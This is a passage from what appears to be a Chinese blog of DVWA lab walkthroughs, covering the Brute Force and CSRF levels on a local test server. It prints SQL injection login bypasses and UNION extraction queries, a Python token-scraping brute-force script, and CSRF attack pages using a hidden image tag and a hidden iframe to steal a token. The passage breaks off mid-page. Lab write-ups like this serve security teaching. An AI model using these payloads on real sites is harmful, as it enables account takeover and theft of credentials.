class="image-caption"></div>            </figure><p>从爆破结果的响应包长度来看，只有值为password的响应包长度与众不同，猜测正确密码就是password，尝试登陆，成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)sql注入</p><p>首先寻找注入点，这里因为$pass经过md5加密，所以不能当做注入点，注入点就只剩下了$user</p><p>我们可以使用万能密码登录，在username中输入admin’ or ‘1’=’1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>登录成功</p><p>也可以输入admin’#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样登录成功</p><p>如果要获取admin的密码信息，我们可以继续注入</p><p>因为服务器限制了查询结果返回的行数只能为1，所以要获取信息，我们必须能让$user值在数据库中不存在</p><p>任意输入username值为 0‘# 测试不存在该用户名</p><p>因为这里有返回信息，我们可以考虑用较为简单的联合查询注入</p><p>那么首先我们就必须知道查询的列数，输入admin’ order by 9#发现报错</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以查询列数为8</p><p>接下来就是找获取有效信息的位置，我们输入0’ union select 1,2,3,4,5,6,7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从页面上看是获取不到我们需要的信息，因为图片加载不出来，但是我们可以从源代码看</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>有效信息在6所处的位置，因此我们在6的位置开始注入</p><p>首先爆库</p><p>输入0’ union select 1,2,3,4,5,database(),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接着爆表</p><p>输入0’ union select 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=database()),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再来爆列</p><p>输入0’ union select 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_name=’users’),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后爆数据</p><p>输入0’ union select 1,2,3,4,5,(select password from users where user=’admin’),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是这里获取到的密码经过md5加密，md5又属于单向加密技术，所以这个密码并没有实际的用处</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Login&apos;]))&#123;</span><br><span class="line">$user=$_GET[&apos;username&apos;];</span><br><span class="line">$user=mysql_real_escape_string($user);</span><br><span class="line">$pass=$_GET[&apos;password&apos;];</span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">if($result &amp;&amp; mysql_num_rows($result) == 1)&#123;</span><br><span class="line">$avatar=mysql_result($result,0,&apos;avatar&apos;);</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; </span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">sleep(2);</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>相对于上一关，这关对$user和$pass进行了mysql_real_escape的转义处理，预防了sql注入</p><p>并且登录失败时会sleep 2秒</p><p>虽然预防了sql注入，但是依然可以利用burp爆破密码，跟上一关一样就不演示了</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Login&apos;]))&#123;</span><br><span class="line">//CheckAnti-CSRFtoken</span><br><span class="line">checkToken($_REQUEST[&apos;user_token&apos;],$_SESSION[&apos;session_token&apos;],&apos;index.php&apos;);</span><br><span class="line"></span><br><span class="line">//Sanitiseusernameinput</span><br><span class="line">$user=$_GET[&apos;username&apos;];</span><br><span class="line">$user=stripslashes($user);</span><br><span class="line">$user=mysql_real_escape_string($user);</span><br><span class="line"></span><br><span class="line">//Sanitisepasswordinput</span><br><span class="line">$pass=$_GET[&apos;password&apos;];</span><br><span class="line">$pass=stripslashes($pass);</span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line">//Checkdatabase</span><br><span class="line">$query=&quot;SELECT*FROM`users`WHEREuser=&apos;$user&apos;ANDpassword=&apos;$pass&apos;;&quot;;</span><br><span class="line">$result=mysql_query($query)or die(&apos;&lt;pre&gt;&apos;.mysql_error().&apos;&lt;/pre&gt;&apos;);</span><br><span class="line"></span><br><span class="line">if($result&amp;&amp;mysql_num_rows($result)==1)&#123;</span><br><span class="line">//Getusersdetails</span><br><span class="line">$avatar=mysql_result($result,0,&quot;avatar&quot;);</span><br><span class="line"></span><br><span class="line">//Loginsuccessful</span><br><span class="line">echo&quot;&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">echo&quot;&lt;imgsrc=&quot;&#123;$avatar&#125;&quot;/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">//Loginfailed</span><br><span class="line">sleep(rand(0,3));</span><br><span class="line">echo&quot;&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//GenerateAnti-CSRFtoken</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>加入了token验证机制，我们每次登录时都必须提交一个token值，服务器将提交的token值与cookie或session中的token值对比，若不同则拦截下来，也就是说用之前burp爆破密码的方法是行不通的</p><p>还利用了mysql_real_escape_string函数对$user和$pass进行了转义处理，防止了sql注入</p><p>这里我们要想登录，就必须获取到token值，这关利用python脚本进行爆破</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/brute/"</span></span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">'Host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://127.0.0.1/dvwa/vulnerabilities/brute/'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6'</span>,</span><br><span class="line"><span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">&#125;</span><br><span class="line">file=open(<span class="string">'pass.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">    line=line.strip()</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    r=s.get(url,headers=header)</span><br><span class="line">    soup=BeautifulSoup(r.text,<span class="string">'html.parser'</span>)</span><br><span class="line">    user_token=soup.find_all(<span class="string">'input'</span>)[<span class="number">3</span>][<span class="string">'value'</span>]</span><br><span class="line">    payload=&#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">        <span class="string">'password'</span>:line,</span><br><span class="line">        <span class="string">'user_token'</span>:user_token,</span><br><span class="line">        <span class="string">'Login'</span>:<span class="string">'Login'</span></span><br><span class="line">        &#125;</span><br><span class="line">    html=s.get(url,params=payload,headers=header)</span><br><span class="line">    length=len(html.text)</span><br><span class="line">    print(<span class="string">'user_token:'</span>+user_token+<span class="string">'username:admin password:'</span>+line+<span class="string">' length:'</span>+str(length))</span><br></pre></td></tr></table></figure><p>思路是首先读取文件中一个个猜测的密码，这里只用10个密码进行模拟，然后创建一个会话记录，用于保政访问页面的token值不发生变化，然后利用BeautifulSoup库的find_all方法获取所有input标签组成的列表，带有token值的input标签在列表的第三个元素，然后将value属性的值，也就是token值取出，这就获得了token值，然后再将各个参数通过get形式传递给服务器，最终比较返回页面的长度，正常而言，输入正确和失败返回的页面长度是不同的，所以众多猜测密码中，只有一个密码返回的页面长度是不同的，那个密码就可能是正确的密码</p><p>这里还应当注意，应先用burp抓包获取访问登录页面的请求头，否则脚本每次访问的都是dvwa一开始的登录页面</p><p>脚本执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出password的返回长度跟其他不同，在登录页面输入，登录成功</p>]]></content>
    
    <summary type="html">
    
      dvwa-Brute Force
    
    </summary>
    
      <category term="dvwa-Brute Force" scheme="https://Foxgrin.github.io/categories/dvwa-Brute-Force/"/>
    
    
      <category term="Brute Force" scheme="https://Foxgrin.github.io/tags/Brute-Force/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-CSRF</title>
    <link href="https://Foxgrin.github.io//posts/48103/"/>
    <id>https://Foxgrin.github.io//posts/48103/</id>
    <published>2018-07-13T06:26:00.000Z</published>
    <updated>2018-07-13T16:32:30.852Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中关于跨网站请求伪造的一些关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connection.php"</span>);</span><br><span class="line"></span><br><span class="line">$pass_new=$_GET[<span class="string">'password_new'</span>];</span><br><span class="line">$pass_conf=$_GET[<span class="string">'password_conf'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'password_new'</span>] == $_GET[<span class="string">'password_conf'</span>])&#123;</span><br><span class="line">$pass_new=mysql_real_escape_string($pass_new);</span><br><span class="line">$pass_new=md5($pass_new);</span><br><span class="line">$username=$_COOKIE[<span class="string">'Username'</span>];</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"UPDATE users SET password='$pass_new' WHERE user='$username'"</span>;</span><br><span class="line">$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your password has changed"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password didn't match"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源代码可以看出，这是一个修改密码的程序，而$username是取决于中cookie的Username字段值，也就是说，当我们以一个用户身份登录时，服务器会将用户的信息保存在cookie中，下次访问时，就不需要再登录，浏览器直接按之前保存的身份信息登录。这就可能导致了一种CSRF（Cross-site request forgery,跨网站请求伪造）的漏洞，因为修改的密码都是以GET的形式发送给服务器，所以攻击者可以伪造一个url，诱导受害者去点击，受害者一旦点击，如果浏览器之前保存了身份认证信息，用户的密码就会被恶意修改，它与XSS的区别在于，它并没有盗取用户的cookie，而是直接利用用户的cookie，从而完成非法操作。</p><p>构造链接：</p><p>(1)最基础的链接：<a href="http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change" target="_blank" rel="noopener">http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change</a></p><p>当受害者点击了这个链接，他的密码直接就会被修改成hack</p><p>但是这种链接简单直白的告诉了稍微看得懂一点url的人…很明显的就是想篡改他的密码，也就只能骗一骗那些完全不懂的小白</p><p>需要注意的是，CSRF最关键的就是利用用户的cookie向服务器发送伪造请求，也就是说，如果浏览器未保存用户的身份信息，那受害者点击链接时就会自动进入登录界面，攻击就失效了</p><p>有保存用户信息的浏览器，比如Chrome浏览器</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Chrome的检查功能可以很明显的看到保存了cookie信息</p><p>而有些浏览器未能保存cookie信息，CSRF攻击就实现不了</p><p>(2)构造短链接</p><p>利用百度短网址系统将网址缩短成一个短网址</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>由于是本地搭的环境，所以生成不了，实际场景下目标服务器不是域名的话是可以生成短链接的</p><p>这种方法虽然链接看起来不像是攻击链接，但是受害者依然能看到修改密码成功的提示信息</p><p>(3)构造攻击页面</p><p>为了能让用户点击攻击链接，又能不让用户察觉到自己的密码被修改了，我们可以构造一个页面，里面包含了攻击链接，让用户去点击</p><p>我们写一个test.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change&quot; style=&quot;display:none&quot;&gt;</span><br><span class="line">&lt;h1&gt;404&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当受害者访问这个页面时，一个看不见的图片标签就自动访问了修改密码的页面，受害者还误以为自己访问了一个失效的url，实际上自己的密码已经被修改为了hack</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;change&apos;]))&#123;</span><br><span class="line">if(eregi($_SERVER[&apos;SERVER_NAME&apos;],$_SERVER[&apos;HTTP_REFERER&apos;]))&#123;</span><br><span class="line">$pass_new=$_GET[&apos;password_new&apos;];</span><br><span class="line">$pass_conf=$_GET[&apos;password_conf&apos;];</span><br><span class="line">$username=$_COOKIE[&apos;Username&apos;];</span><br><span class="line"></span><br><span class="line">if($pass_new == $pass_conf)&#123;</span><br><span class="line">$pass_new=mysql_real_escape_string($pass_new);</span><br><span class="line">$pass_new=md5($pass_new);</span><br><span class="line">$sql=&quot;UPDATE users SET password=&apos;$pass_new&apos; WHERE user=&apos;$username&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">echo &quot;Your password has changed&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Password didn&apos;t match&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;That request didn&apos;t look correct&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>与上一关的区别在于这里加了一个过滤条件，首先先查一下eregi函数的用法</p><p>eregi(string pattern,string string):在一个字符串string中搜索指定模式pattern的字符串，不分大小写，如果匹配成功则返回true，不成功则返回false</p><p>再查阅一下全局变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;SERVER_NAME&apos;]:http包头的Host参数，即要访问的主机名</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]:http包头的Referer参数的值，表示来源地址</span><br></pre></td></tr></table></figure><p>看完不理解也没事，我们利用burp抓包看一下就大概明白了</p><p>我们先在提交的表单中输入password为hack</p><p>然后点击提交</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后用burp抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Host值就是要访问的主机名，Referer值就是来源地址</p><p>这是在网页中的表单中提交数据，所以来源地址是这个网页的地址</p><p>我们最终访问主机名一定是127.0.0.1,所以127.0.0.1一定要出现在Referer值中，这起到了一定的过滤作用，如果受害者访问我们伪造的攻击网站，攻击网站向服务器发出伪造请求，会被服务器检测来源地址，地址中不带127.0.0.1的话，就会被过滤掉，但是这种过滤很好解决，即使不理解上面两个参数的意思，我们只要用burp修改请求头的Host和Referer参数，让两个参数都带有一样的内容就ok了</p><p>我们在浏览器中访问<a href="http://127.0.0.1/demo/CSRF/medium-change.php?password_new=hack&amp;password_conf=hack&amp;change=change" target="_blank" rel="noopener">http://127.0.0.1/demo/CSRF/medium-change.php?password_new=hack&amp;password_conf=hack&amp;change=change</a></p><p>然后用burp抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们看到请求头中只有Host参数，没有Referer参数，这是因为我们是在空白的页面访问的，所以没有来源地址，这时候点击go</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现请求被过滤了</p><p>我们在请求头中添加Referer参数，随便输入一个带127.0.0.1的值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>添加Referer参数后修改密码成功</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Do the passwords match? </span><br><span class="line">    if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        // They do! </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        // Update the database </span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; </span><br><span class="line">        $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for the user </span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Issue with passwords matching </span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关加入了token认证机制，能非常有效的预防CSRF攻击，它的防御过程如下：</p><p>(1)每当用户登录后会随机产生一段字符串，并且存储在Session或者Cookie中</p><p>(2)在敏感操作中加入隐藏标签，value即为Session中保存的字符串，如本关中的表单加入了隐藏标签，提交的内容就是Session中保存的字符串</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(3)用户提交请求后，服务器将请求提交的Token字符串与Session中的字符串进行比较，如果一致，则认为是正常请求，否则可能是CSRF攻击</p><p>(4)更新Token值</p><p>所以，要绕过Token认证，就必要想办法获得存储在Session或者Cookie当中的Token值</p><p>破解token认证思路是在攻击页面上利用隐藏的iframe框架访问修改密码的页面，然后用javascript代码获取页面token值再赋值给攻击页面表单，再模拟提交隐藏表单</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;high-attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function attack()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&apos;hack&apos;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;</span><br><span class="line">document.getElementById(&apos;transfer&apos;).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot; id=&apos;hack&apos; border=&apos;0&apos; style=&apos;display:none&apos;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=&quot;transfer&quot; method=&apos;get&apos; 